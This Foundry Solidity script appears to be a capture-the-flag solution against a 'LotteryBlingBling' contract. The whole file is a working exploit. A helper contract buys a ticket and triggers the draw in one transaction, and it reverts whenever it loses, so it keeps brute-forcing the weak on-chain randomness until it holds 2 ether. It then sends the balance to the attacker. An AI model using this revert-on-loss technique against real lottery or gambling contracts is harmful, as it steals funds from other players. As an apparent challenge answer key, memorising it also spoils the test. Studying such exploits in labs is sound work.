pragma solidity 0.8.28;

import "forge-std/Script.sol";

interface ISetup {
    function lotteryBlingBling() external view returns (address);
    function isSolved() external view returns (bool);
}

interface ILotteryBlingBling {
    function buyTicket() external payable;
    function pickWinner() external;
    function lastWinner() external view returns (address);
}

contract Solve is Script {
    function run() public {
        ISetup setup = ISetup(vm.envAddress("SETUP"));
        ILotteryBlingBling lotteryBlingBling = ILotteryBlingBling(
            setup.lotteryBlingBling()
        );

        vm.startBroadcast(vm.envUint("PRIV"));
        address user = vm.addr(vm.envUint("PRIV"));

        LotteryBruteForceExploit exploit = new LotteryBruteForceExploit{
            value: 1 ether
        }(address(lotteryBlingBling));

        exploit.earnMoney();
        exploit.withdraw();

        require(setup.isSolved());
        vm.stopBroadcast();
    }
}

contract LotteryBruteForceExploit {
    ILotteryBlingBling public targetLottery;
    address public attacker;

    constructor(address _lotteryAddress) payable {
        targetLottery = ILotteryBlingBling(_lotteryAddress);
        attacker = msg.sender;
    }

    function tryWin() public {
        targetLottery.buyTicket{value: 1 ether}();
        targetLottery.pickWinner();

        if (targetLottery.lastWinner() != address(this)) {
            revert("Failed to win");
        }
    }

    function earnMoney() public {
        while (address(this).balance < 2 ether) {
            (bool success, ) = address(this).call{value: 0}(
                abi.encodeWithSignature("tryWin()")
            );
        }
    }

    function withdraw() public {
        payable(attacker).transfer(address(this).balance);
    }

    fallback() external payable {}
}
